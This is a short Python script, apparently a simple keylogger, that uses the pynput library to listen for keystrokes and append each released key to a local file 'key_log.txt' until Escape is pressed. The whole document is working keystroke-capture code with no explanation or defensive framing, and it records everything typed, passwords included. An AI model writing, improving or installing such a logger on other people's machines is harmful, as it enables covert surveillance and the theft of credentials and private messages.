from pynput import keyboard

with open('key_log.txt' , 'a') as f:
    f.write('New Session\n\n')


def on_release(key):
    key_str = str(key).replace("'" , "")
    if key==keyboard.Key.esc:
        return False
    elif key == keyboard.Key.space:
            key_str = ' '
    elif key == keyboard.Key.enter:
            key_str = '\n'
    with open('key_log.txt' , 'a') as f:
        f.write(key_str)


with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
